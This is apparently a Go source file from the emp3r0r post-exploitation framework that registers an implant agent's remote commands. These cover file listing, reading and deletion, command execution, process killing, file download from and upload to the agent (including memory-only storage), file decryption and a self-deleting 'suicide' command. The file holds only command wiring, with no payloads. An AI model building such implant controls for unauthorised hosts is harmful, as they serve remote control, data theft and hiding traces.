package handler

import (
	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/shellhelper"
	"github.com/spf13/cobra"
)

func CoreCommands() *cobra.Command {
	rootCmd := &cobra.Command{
		Short: "agent core commands",
	}
	// Define groups sorted by name
	rootCmd.AddGroup(
		&cobra.Group{ID: "agent", Title: "Agent Commands"},
		&cobra.Group{ID: "filesystem", Title: "File System Commands"},
		&cobra.Group{ID: "file_transfer", Title: "File Transfer Commands"},
		&cobra.Group{ID: "network", Title: "Network Commands"},
		&cobra.Group{ID: "process", Title: "Process Commands"},
	)
	rootCmd.PersistentFlags().StringP("cmd_id", "", "", "Command ID")

	// Filesystem commands
	lsCmd := &cobra.Command{
		Use:     "ls",
		Short:   "List files in a directory",
		Run:     shellhelper.LsCmdRun,
		GroupID: "filesystem",
	}
	lsCmd.Flags().StringP("dst", "d", ".", "Directory to list files")
	lsCmd.RegisterFlagCompletionFunc("dst", memFileCompletion)
	rootCmd.AddCommand(lsCmd)

	catCmd := &cobra.Command{
		Use:     "cat",
		Short:   "Read file content",
		Run:     shellhelper.CatCmdRun,
		GroupID: "filesystem",
	}
	catCmd.Flags().StringP("dst", "d", "", "File to read")
	catCmd.RegisterFlagCompletionFunc("dst", memFileCompletion)
	rootCmd.AddCommand(catCmd)

	rmCmd := &cobra.Command{
		Use:     "rm",
		Short:   "Remove file or directory",
		Run:     shellhelper.RmCmdRun,
		GroupID: "filesystem",
	}
	rmCmd.Flags().StringP("dst", "d", "", "Path to remove")
	rmCmd.RegisterFlagCompletionFunc("dst", memFileCompletion)
	rootCmd.AddCommand(rmCmd)

	mkdirCmd := &cobra.Command{
		Use:     "mkdir",
		Short:   "Create directory",
		Run:     shellhelper.MkdirCmdRun,
		GroupID: "filesystem",
	}
	mkdirCmd.Flags().StringP("dst", "d", "", "Directory to create")
	rootCmd.AddCommand(mkdirCmd)

	cpCmd := &cobra.Command{
		Use:     "cp",
		Short:   "Copy file or directory",
		Run:     shellhelper.CpCmdRun,
		GroupID: "filesystem",
	}
	cpCmd.Flags().StringP("src", "s", "", "Source path")
	cpCmd.RegisterFlagCompletionFunc("src", memFileCompletion)
	cpCmd.Flags().StringP("dst", "d", "", "Destination path")
	cpCmd.RegisterFlagCompletionFunc("dst", memFileCompletion)
	rootCmd.AddCommand(cpCmd)

	mvCmd := &cobra.Command{
		Use:     "mv",
		Short:   "Move file or directory",
		Run:     shellhelper.MvCmdRun,
		GroupID: "filesystem",
	}
	mvCmd.Flags().StringP("src", "s", "", "Source path")
	mvCmd.RegisterFlagCompletionFunc("src", memFileCompletion)
	mvCmd.Flags().StringP("dst", "d", "", "Destination path")
	mvCmd.RegisterFlagCompletionFunc("dst", memFileCompletion)
	rootCmd.AddCommand(mvCmd)

	cdCmd := &cobra.Command{
		Use:     "cd",
		Short:   "Change directory",
		Run:     shellhelper.CdCmdRun,
		GroupID: "filesystem",
	}
	cdCmd.Flags().StringP("dst", "d", "", "Target directory")
	rootCmd.AddCommand(cdCmd)

	pwdCmd := &cobra.Command{
		Use:     "pwd",
		Short:   "Print working directory",
		Run:     shellhelper.PwdCmdRun,
		GroupID: "filesystem",
	}
	rootCmd.AddCommand(pwdCmd)

	// Process commands
	psCmd := &cobra.Command{
		Use:     "ps",
		Short:   "List processes",
		Run:     shellhelper.PsCmdRun,
		GroupID: "process",
	}
	psCmd.Flags().IntP("pid", "p", 0, "Process ID")
	psCmd.Flags().StringP("name", "n", "", "Process name")
	psCmd.Flags().StringP("user", "u", "", "User")
	psCmd.Flags().StringP("cmdline", "c", "", "Command line")
	rootCmd.AddCommand(psCmd)

	killCmd := &cobra.Command{
		Use:     "kill <pid> [pid...] | kill --pid <pid>",
		Short:   "Kill process(es) by PID",
		Long:    "Kill one or more processes by their process IDs. Supports both positional arguments and --pid flag.",
		Example: "kill 1234 5678\nkill --pid 1234",
		Run:     killCmdRun,
		GroupID: "process",
	}
	killCmd.Flags().IntP("pid", "p", 0, "Process ID to kill (alternative to positional args)")
	rootCmd.AddCommand(killCmd)

	execCmd := &cobra.Command{
		Use:     "exec",
		Short:   "Execute command",
		Run:     execCmdRun,
		GroupID: "process",
	}
	execCmd.Flags().StringP("cmd", "c", "", "Command to execute")
	execCmd.Flags().BoolP("bg", "b", false, "Run in background")
	rootCmd.AddCommand(execCmd)

	// Network commands
	netHelperCmd := &cobra.Command{
		Use:     "net_helper",
		Short:   "Display network information",
		Run:     netHelperCmdRun,
		GroupID: "network",
	}
	rootCmd.AddCommand(netHelperCmd)

	// Agent commands
	suicideCmd := &cobra.Command{
		Use:     "suicide",
		Short:   "Delete agent files and exit",
		Run:     suicideCmdRun,
		GroupID: "agent",
	}
	rootCmd.AddCommand(suicideCmd)

	// File Transfer commands (new group)
	getCmd := &cobra.Command{
		Use:     "get",
		Short:   "Download file from agent",
		Run:     getCmdRun,
		GroupID: "file_transfer",
	}
	getCmd.Flags().StringP("file_path", "f", "", "File or directory to download")
	getCmd.RegisterFlagCompletionFunc("file_path", memFileCompletion)
	getCmd.Flags().StringP("filter", "r", "", "Regex filter for files")
	getCmd.Flags().Int64P("offset", "o", 0, "Download offset")
	getCmd.Flags().StringP("token", "t", "", "Download token")
	rootCmd.AddCommand(getCmd)

	putCmd := &cobra.Command{
		Use:     "put",
		Short:   "Upload file to agent",
		Run:     putCmdRun,
		GroupID: "file_transfer",
	}
	putCmd.Flags().StringP("file", "", "", "File to upload")
	putCmd.Flags().StringP("path", "", "", "Destination path")
	putCmd.RegisterFlagCompletionFunc("path", memFileCompletion)
	putCmd.Flags().Int64P("size", "", 0, "Size of file")
	putCmd.Flags().StringP("checksum", "", "", "File checksum")
	putCmd.Flags().StringP("addr", "", "", "Download address")
	putCmd.Flags().BoolP("mem", "m", false, "Save file to memory")
	rootCmd.AddCommand(putCmd)

	decryptCmd := &cobra.Command{
		Use:     "decrypt",
		Short:   "Decrypt a file on the agent",
		Run:     decryptCmdRun,
		GroupID: "filesystem",
	}
	decryptCmd.Flags().StringP("path", "p", "", "File to decrypt")
	decryptCmd.RegisterFlagCompletionFunc("path", memFileCompletion)
	decryptCmd.Flags().StringP("out", "o", "", "Output path (default: <path>.dec)")
	decryptCmd.RegisterFlagCompletionFunc("out", memFileCompletion)
	rootCmd.AddCommand(decryptCmd)

	return rootCmd
}
